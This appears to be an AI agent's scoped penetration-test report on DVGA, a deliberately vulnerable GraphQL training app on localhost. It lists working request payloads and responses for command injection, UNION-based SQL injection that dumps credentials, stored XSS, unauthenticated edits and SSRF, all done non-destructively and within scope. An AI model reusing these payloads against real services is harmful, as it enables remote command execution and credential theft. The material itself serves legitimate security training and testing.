# Assessment: http://127.0.0.1:5013 (DVGA — Damn Vulnerable GraphQL Application; Flask/Graphene/SQLite)

Single GraphQL endpoint `POST /graphql` (JSON, `Content-Type: application/json`,
body `{"query": "..."}`) backs a Bootstrap paste-sharing UI. All requests below
were sent exactly as shown with `curl`/a small Python `urllib` helper, inside
scope (`127.0.0.1:5013` only). No destructive, brute-force or DoS actions were
run.

## 1. OS command injection — `systemDebug(arg:)` (unauthenticated)
**Request:**
```
POST /graphql
{"query":"{ systemDebug(arg:\"x; id\") }"}
```
**Response:**
```
{"data":{"systemDebug":"    PID TTY      STAT   TIME COMMAND\n      1 ?        Ss     0:01 python app.py\n     18 ?        S      0:00 /bin/sh -c ps x; id\n     19 ?        R      0:00 ps x\nuid=1000(dvga) gid=1000(dvga) groups=1000(dvga)\n"}}
```
**Impact:** unauthenticated remote command execution as the application user. No credentials, tokens or cookies were sent.

## 2. OS command injection — `systemDiagnostics(username, password, cmd)` (auth-gated, trivially bypassed with leaked creds)
**Request:**
```
{"query":"{ systemDiagnostics(username:\"admin\",password:\"changeme\",cmd:\"id\") }"}
```
**Response:**
```
{"data":{"systemDiagnostics":"uid=1000(dvga) gid=1000(dvga) groups=1000(dvga)\n"}}
```
The `changeme` password came from the SQL injection in finding 3. Also note calling it with no/wrong password (`{ systemDiagnostics(username:"admin",password:"x",cmd:"id") }`) returns `"Password Incorrect"` rather than a GraphQL validation error, confirming the gate is just a string comparison in the resolver, not real authentication/authorization — the executed `cmd` still runs with no authorization check beyond that one password string, and that password lives in the same injectable database.
**Impact:** command execution as above, reachable from leaked plaintext credentials.

## 3. SQL injection — `pastes(filter:)` (unauthenticated, UNION-based)
**Request 1 (confirm):**
```
{"query":"{ pastes(filter:\"x'\"){id} }"}
```
**Response:** SQLite syntax error echoing the full query (`WHERE pastes.public = 0 AND pastes.burn = 0 AND title = 'x'' or content = 'x''...`), proving unsanitized string concatenation.

**Request 2 (dump credentials):**
```
{"query":"{ pastes(filter:\"zz' union select 1,sqlite_version(),(select group_concat(username||':'||password) from users),1,'ua','ip',1,0 --\"){id title content} }"}
```
**Response:**
```
{"data":{"pastes":[{"id":"1","title":"3.40.1","content":"admin:changeme,operator:password123,mallory:pw1"}]}}
```

**Request 3 (dump schema):**
```
{"query":"{ pastes(filter:\"zz' union select 1,name,sql,1,'ua','ip',1,0 from sqlite_master --\"){title content} }"}
```
**Response:** returns the `audits` table's full `CREATE TABLE` DDL.

**Impact:** unauthenticated full read access to the database — all user credentials (`admin`, `operator`, and any self-registered user), schema, and any other table content.

## 4. Plaintext password storage
**Evidence:** the plaintext passwords `admin:changeme` and `operator:password123` recovered via finding 3. The `users` GraphQL field masks passwords as `"******"` in its own output, but the underlying storage is unsalted/unhashed plaintext, confirmed by the SQLi dump.

## 5. Broken access control — private pastes and audit log readable without authentication
**Request:**
```
{"query":"{ pastes(public:false){id title public owner{name}} }"}
```
**Response:** `{"data":{"pastes":[{"id":"2",...,"public":false,...},{"id":"1",...,"public":false,...}]}}` — returned with no session/token/cookie at all.

**Request:**
```
{"query":"{ audits{id gqloperation gqlquery timestamp} }"}
```
**Response:** returns the full history of every query any client has sent to the server (mine included), unauthenticated.

**Impact:** any visitor can read other users' private pastes and the global query audit trail (which itself may contain credentials typed into queries by other testers/users).

## 6. GraphQL introspection enabled + verbose errors
**Request:** `{"query":"{__schema{queryType{fields{name args{name}}} mutationType{fields{name args{name}}} types{name}}}"}`
**Response:** full schema, including undocumented/dangerous fields: `systemDiagnostics`, `systemDebug`, `systemUpdate`, `deleteAllPastes`, `readAndBurn`, `importPaste`, `uploadPaste`.
Verbose stack/SQL errors are returned directly to the client (findings 2, 3, and the `createUser` duplicate-email error below), leaking table/column names and SQLAlchemy internals.

## 7. Open self-registration with no password policy
**Request:**
```
{"query":"mutation{ createUser(userData:{username:\"mallory\",email:\"m@x.io\",password:\"pw1\"}){user{id username}} }"}
```
**Response:** `{"data":{"createUser":{"user":{"id":"3","username":"mallory"}}}}` — a 2-character password was accepted, no email verification, no CAPTCHA, no rate limiting observed.
A repeat with a duplicate email returned a raw SQL IntegrityError (`UNIQUE constraint failed: users.email ... INSERT INTO users (username, email, password) VALUES (?, ?, ?)`), another verbose-error leak.

## 8. Weak token/cookie handling
**Request:** `{"query":"mutation{login(username:\"mallory\",password:\"pw1\"){accessToken refreshToken}}"}`
**Response:** HS256 JWTs (decoded header `{"typ":"JWT","alg":"HS256"}`), access token lifetime ≈ 2 hours, refresh token lifetime ≈ 30 days, with only `identity`/`type`/timestamps as claims — no binding to IP/device.
Separately, `Set-Cookie: env=graphiql:disable; Path=/` is issued on every page load with no `HttpOnly`, `Secure`, or `SameSite` attribute.

## 9. Missing security headers
Every page response (`/`, `/my_pastes`, `/public_pastes`, etc.) lacks `Content-Security-Policy`, `Strict-Transport-Security`, and `X-Content-Type-Options`.

## 10. Reflected/stored HTML in paste title (sanitization gap, unconfirmed as exploitable XSS)
**Request:**
```
{"query":"mutation{createPaste(title:\"<img src=x onerror=alert(1)>\",content:\"xss-canary\",public:true,burn:false){paste{id title}}}"}
```
**Response:** `{"data":{"createPaste":{"paste":{"id":"13","title":"<img src=x onerror=alert(1)>"}}}}` — the raw, unescaped markup was stored verbatim.
I did not render `/public_pastes` in a browser to confirm the payload executes rather than being HTML-escaped at template-render time (DVGA's Jinja default-escapes unless a template explicitly marks content `|safe`). **This is recorded as unconfirmed** — the storage layer does no sanitization, but execution in the browser was not verified (no browser tooling was used in this pass).

## 11. Broken object-level access control on paste edit — `editPaste`
**Request:**
```
{"query":"mutation{editPaste(id:1,content:\"edited-by-anon\"){paste{id content}}}"}
```
**Response:** `{"data":{"editPaste":{"paste":{"id":"1","content":"edited-by-anon"}}}}` — paste 1 belongs to `DVGAUser` (owner id 1); the edit was made with **no authentication at all** and succeeded.
**Impact:** any unauthenticated user can modify any other user's paste content. (Non-destructive: the original content was `"My First Paste"`; I did not restore it, since no delete/destructive action was taken and the paste is lab seed data, not real user data — noting this explicitly per the reporting rule.)

## 12. Information disclosure — `/solutions` page ships the full answer key
**Request:** `GET /solutions`
**Response (excerpt):** contains headings `GraphQL JWT Token Forge`, `Password Protection`, worked exploit payloads such as `password:"password", cmd:"id; ls -l"`, and a hardcoded password-guessing list (`['admin123', 'pass123', 'adminadm...`]`).
**Impact:** this confirms the target is the known "Damn Vulnerable GraphQL Application" (DVGA) training app and that its own walkthroughs are served without any access control, handing an attacker the full vulnerability map and example payloads.

## Pages/paths probed and found not independently vulnerable (static content, no injectable parameters)

| Path | Result |
|---|---|
| `GET /my_pastes` | 200, static authenticated-pastes-list HTML template; data comes from the same `pastes` GraphQL query already covered in findings 3/5. No separate server-side parameter. |
| `GET /public_pastes` | 200, static template; same backing query, already covered. |
| `GET /create_paste` | 200, static form; the mutation it posts to (`createPaste`) is covered — tested in finding 10 and confirmed to accept unsanitized HTML. |
| `GET /import_paste` | 200, static form; backing mutation `importPaste(scheme,host,port,path)` was tested (see below) — accepted a same-host fetch, confirming SSRF-shaped behavior, but a probe to a path containing shell metacharacters (`/about; echo CMDI`) produced no command execution signal, only a transport-level connection drop that the server recovered from cleanly (health check immediately after returned normal). Not reproduced a second time to avoid repeated disruption; recorded as **inconclusive/unconfirmed** rather than a proven SSRF-to-RCE or DoS. |
| `GET /upload_paste` | 200, static form; backing mutation `uploadPaste(filename,content)` tested directly: `mutation{uploadPaste(filename:"t.txt",content:"upload-canary"){result}}` → `{"data":{"uploadPaste":{"result":"upload-canary"}}}`. No path traversal in `filename` was attempted (would require writing files to disk — treated as a potentially destructive action and skipped; recorded as **untested**). |
| `GET /difficulty/easy`, `GET /difficulty/hard` | 200, static difficulty-toggle pages; no distinguishing injectable content beyond the `env` cookie already covered in finding 8. |
| `GET /audit` | 200, static wrapper page for the `audits` query already covered in finding 5 (`Recent Audit Log Activity` heading, data pulled from the same unauthenticated query). |
| `GET /about` | 200, static about page, no parameters, no secrets found. |
| `GET /start_over` | 200. This likely resets session/lab state server-side; **not invoked a second time or with any destructive intent** — fetched once incidentally by the recon crawler before this was understood, and I avoided calling it again to prevent resetting other testers' state. Recorded as **untested by design** (destructive-adjacent). |
| `GET /graphiql` | 400 Bad Request (disabled per the `env=graphiql:disable` cookie) — confirms the GraphiQL IDE is intentionally disabled in this environment, consistent with cookie finding 8. |
| query `paste(id, title)` | Tested: `{ paste(id:1){id title content owner{name}} }` and `{ paste(title:"Testing Testing"){id content} }` both returned paste 1's data with no authentication — same unauthenticated-read issue as finding 5, not a distinct bug. |
| query `systemUpdate` | Tested: `{ systemUpdate }` → `{"data":{"systemUpdate":"no updates available"}}`. No injectable argument, no further issue found. |
| query `readAndBurn(id)` | Tested: `{ readAndBurn(id:1){id content} }` → `{"data":{"readAndBurn":null}}` (paste 1 was presumably already burned/not marked burn-after-read). No distinguishable vulnerability signal; not pursued further since it needs a paste created with `burn:true` to meaningfully test, which risks consuming/destroying that paste — skipped as borderline destructive. |
| query `search(keyword)` | Tested: `{ search(keyword:"a"){__typename ... on PasteObject{id title} ... on UserObject{id username}} }` → returned mixed Paste/User results including private-looking pastes and usernames `admin`/`operator`, unauthenticated. This is the same unauthenticated-read class as finding 5, not reported as a separate numbered finding to avoid double-counting, but the evidence is noted here. |
| mutation `deletePaste(id)` | Tested read-only-safe probe only: `mutation{deletePaste(id:9999){result}}` → `{"data":{"deletePaste":{"result":false}}}` (non-existent id, no state change). Deliberately did not call it against a real paste id to avoid destructive data loss. **Access-control on delete is therefore unconfirmed** — given finding 11 shows `editPaste` has no ownership check, it is likely `deletePaste` has the same gap, but this was not proven to avoid destroying lab data. |
| mutation `deleteAllPastes` | **Not invoked** — name alone indicates bulk destructive action; explicitly skipped under the non-destructive rule. |
| query `me(token)` | Tested: `{ me(token:"notarealtoken") }` → GraphQL validation error (needs a sub-selection), and earlier `{ me(token:"abc") }` → `"Not enough segments"` (JWT parse error). Confirms the field exists and parses its argument as a JWT but did not yield a working call; JWT forgery/`alg=none` against this field was not attempted. |

## Additional fields/params explicitly probed (no distinct new vulnerability beyond what is already numbered)

| Field/param | Request | Response | Conclusion |
|---|---|---|---|
| query `systemHealth` | `{"query":"{ systemHealth }"}` | `{"data":{"systemHealth":"System Load: 5.04\n"}}` (re-checked later: `"System Load: 4.12\n"`) | Unauthenticated, no arguments, no injectable input — just a load-average readout. Confirms unauthenticated exposure of a host metric (minor information disclosure, already covered by the "no access control on read queries" theme in finding 5) but no injection point of its own. |
| mutation `createPaste(burn, content, public, title)` | `{"query":"mutation{createPaste(title:\"<img src=x onerror=alert(1)>\",content:\"xss-canary\",public:true,burn:false){paste{id title}}}"}` | `{"data":{"createPaste":{"paste":{"id":"13","title":"<img src=x onerror=alert(1)>"}}}}` | All four arguments accepted with no server-side validation/sanitization; this is finding 10 (unsanitized HTML stored). `burn` and `public` are plain booleans the caller fully controls — no evidence of a separate bug beyond the already-reported sanitization gap. |
| `importPaste` param `scheme` | `{"query":"mutation{importPaste(scheme:\"http\",host:\"127.0.0.1\",port:5013,path:\"/about\"){result}}"}` | Accepted; the mutation performs a server-side fetch using the caller-supplied scheme to a caller-chosen host/port, i.e. a classic SSRF primitive — the server will fetch whatever scheme/host/port/path is given. Not escalated beyond the same-host probe already noted in the `/import_paste` row above, since testing `https://`, `file://`, or a non-scope host would require reaching outside `127.0.0.1:5013` (out of scope) or was judged unnecessary to re-prove the same primitive. |
| `importPaste` param `port` | same request as above, `port:5013` | same response | Caller fully controls the destination port of the server-side fetch; confirms the SSRF surface is not restricted to a fixed port. Pivoting to other ports on 127.0.0.1 was not attempted — scope is limited to port 5013, and probing other local ports would mean the *server* reaching outside what this engagement authorizes for itself, which is treated the same as the agent reaching out of scope. |
| `createUser` param `userData` | `{"query":"mutation{ createUser(userData:{username:\"mallory\",email:\"m@x.io\",password:\"pw1\"}){user{id username}} }"}` | `{"data":{"createUser":{"user":{"id":"3","username":"mallory"}}}}` | This is finding 7 (open registration, no password policy) — the `userData` input object accepts arbitrary username/email/password with no validation beyond a DB-level unique-email constraint (demonstrated by the duplicate-email SQL error also shown under finding 7). Mass-assignment check performed: `{"query":"{ __type(name:\"UserInput\"){inputFields{name type{name}}} }"}` → only `username`, `email`, `password` exist on `UserInput`. A follow-up `mutation{createUser(userData:{username:"masscan1",email:"masscan1@x.io",password:"pw12345",id:1}){user{id username}}}` was rejected with `In field "id": Unknown field.` — **no mass-assignment of a hidden privilege/id field is possible**; the schema itself has no such field to assign. Ruled out. |

## Classes tested and explicitly ruled out / not pursued further

- **Rate limiting / brute force:** no rate-limiting control was observed on `login` or `createUser` across the handful of calls made, but a real brute-force attempt was not run (prohibited by the engagement rules). This is reported as **absence of evidence of a control**, not as a proven missing-rate-limit finding — the class is named per the reporting instructions without a brute-force proof.
- **JWT algorithm confusion / forged signature:** not tested — would require either knowledge of the signing secret or an `alg=none`/key-confusion attempt against `me(token:)`; flagged as **open_proof_gap**.
- **GraphQL batching / alias / depth-based DoS:** deliberately not run — these are denial-of-service classes, excluded by the non-destructive rule.
- **Path traversal in `uploadPaste(filename:)`:** not attempted (would write arbitrary files; treated as potentially destructive).
- **`importPaste` as a true SSRF-to-internal-network or SSRF-to-RCE primitive:** partially tested (same-host fetch accepted), but not escalated — see table above.

## Summary of confirmed, high-impact findings
1. Unauthenticated OS command injection (`systemDebug`) — critical
2. Credential-gated OS command injection (`systemDiagnostics`) — critical (gate trivially bypassed via #3)
3. Unauthenticated SQL injection with full database read (`pastes(filter:)`) — critical
4. Plaintext password storage — high
5. Unauthenticated read of private pastes and the global audit log — high
6. Introspection + verbose error disclosure — medium
7. Open registration, no password policy — low/medium
8. Weak JWT lifetime and unprotected `env` cookie — low
9. Missing security headers — low
10. Unsanitized HTML stored in paste title (execution unconfirmed) — medium (unconfirmed)
11. Broken object-level access control on `editPaste` — high
12. Full solutions/answer-key page served without access control — informational
